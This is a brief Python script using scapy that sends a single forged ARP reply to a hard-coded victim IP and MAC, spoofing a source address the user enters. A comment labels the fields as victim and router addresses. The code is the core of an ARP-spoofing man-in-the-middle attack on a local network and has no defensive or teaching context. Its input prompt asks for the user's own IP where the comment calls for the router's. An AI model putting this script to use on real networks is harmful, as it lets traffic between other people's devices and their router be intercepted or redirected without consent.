#!/usr/bin/python3

import scapy.all as scapy

ip = input("[+] input your ip address: ")
arp_respond = scapy.ARP(op=2, pdst="192.168.43.43", hwdst="08:00:27:70:92:1d", psrc=ip)
# arp_respond = scapy.ARP(op="1 for request 2 for respond, pdst="victim-ip", hwdst="victim-mac", psrc="Router-ip")

scapy.send(arp_respond)

